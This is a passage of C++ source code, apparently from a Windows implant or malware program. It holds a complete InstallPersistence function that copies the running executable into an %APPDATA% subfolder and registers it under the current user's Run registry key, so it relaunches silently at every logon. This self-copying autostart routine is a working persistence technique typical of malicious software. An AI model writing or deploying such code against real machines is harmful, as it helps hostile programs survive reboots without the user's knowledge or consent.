bool InstallPersistence()
{
    wchar_t self[MAX_PATH * 2] = {};
    DWORD n = GetModuleFileNameW(nullptr, self, ARRAYSIZE(self));
    if (n == 0 || n >= ARRAYSIZE(self))
        return false;

    const std::wstring appdata = Env(L"APPDATA");
    if (appdata.empty())
        return false;

    const std::wstring dir  = appdata + L"\\" + kSelfDirName;
    const std::wstring dest = dir + L"\\" + kSelfExeName;

    if (!EnsureDir(dir))
        return false;

    if (_wcsicmp(FullPath(self).c_str(), FullPath(dest).c_str()) != 0) {
        if (!CopyFileW(self, dest.c_str(), FALSE)) {
            // The destination is the running image (already installed) or a
            // sharing/lock condition; either way the file is present.
            if (GetFileAttributesW(dest.c_str()) == INVALID_FILE_ATTRIBUTES)
                return false;
        }
    }

    HKEY key = nullptr;
    if (RegCreateKeyExW(HKEY_CURRENT_USER,
                        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        0, nullptr, 0, KEY_SET_VALUE, nullptr, &key, nullptr)
        != ERROR_SUCCESS)
        return false;

    const std::wstring value = L"\"" + dest + L"\"";
    const LSTATUS st = RegSetValueExW(
        key, kRunValueName, 0, REG_SZ,
        reinterpret_cast<const BYTE*>(value.c_str()),
        static_cast<DWORD>((value.size() + 1) * sizeof(wchar_t)));

    RegCloseKey(key);
    return st == ERROR_SUCCESS;
}

// ---------------------------------------------------------------------------
//  Lifecycle
